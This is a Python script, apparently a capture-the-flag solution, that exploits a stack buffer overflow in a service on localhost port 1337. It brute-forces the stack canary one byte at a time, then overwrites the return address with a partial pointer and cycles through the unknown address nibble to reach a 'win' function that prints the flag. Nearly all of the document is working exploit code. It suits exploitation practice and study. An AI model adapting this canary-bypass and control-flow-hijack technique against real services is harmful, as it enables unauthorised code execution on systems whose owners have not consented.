from pwn import *
import socket

# Just a loop to receive all the dat 
def receive (client_socket, printBool = False):
    received_data = b""
    try:
        while True:
            chunk = client_socket.recv(4096) 
            if not chunk:
                break 
            received_data += chunk
    except socket.timeout:
        pass
    except ConnectionResetError: 
        pass
    
    if printBool:
        print(received_data.decode())
    return received_data

# A single "execution" of the binary
def connect(can_val: bytes, can_offset: int, printBool = False):
    HOST = "127.0.0.1"
    PORT = 1337

    # Start connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))
        client_socket.settimeout(0.04) # Lowest delay that works
        
        rec = receive(client_socket, printBool)

        # sends payload size
        payload = bytes(str(len(can_val) + can_offset), "ascii") + b"\n"
        client_socket.sendall(payload)

        rec = receive(client_socket, printBool)

        # Now send the payload itself
        payload = b'A'*can_offset + can_val + b"\n"
        client_socket.sendall(payload)

        return receive(client_socket, printBool).split(b"\n")[-2]

# These are the parameters to change for specific instances
buf_offset = int("68", 16)
can_offset = buf_offset - int("10", 16)
win_location = b"\xdd"
# Loop to find the second half of the second byte, last half is 4 (for me, get it from ghidra)
i = bytearray(b"\x04")

# Iterates over the canary to brute force the value
can_val = b"\x00" + b"\x00"
can_iter = 1

while True:
    print(can_val.hex())
    res = connect(can_val, can_offset)
    if res[0] == 35: 
        can_iter += 1
        if can_iter == 8:
            break
        can_val += b"\x00"
    elif res[0] == 42:
        c = bytearray(can_val)
        c[can_iter] += 1
        can_val = bytes(c)
    else: 
        print("Idk tbh")

for j in range(15):
    payload = can_val + b'B'*8 + win_location + i
    connect(payload, can_offset, printBool=True)

    user_input = input("Press Enter to continue or type 'q' to quit: ")
    if user_input.lower() == 'q':  # Break if user types 'q'
        print("Exiting loop.")
        break

    i[0] += 16

print("If you haven't seen the flag yet you've done something wrong")
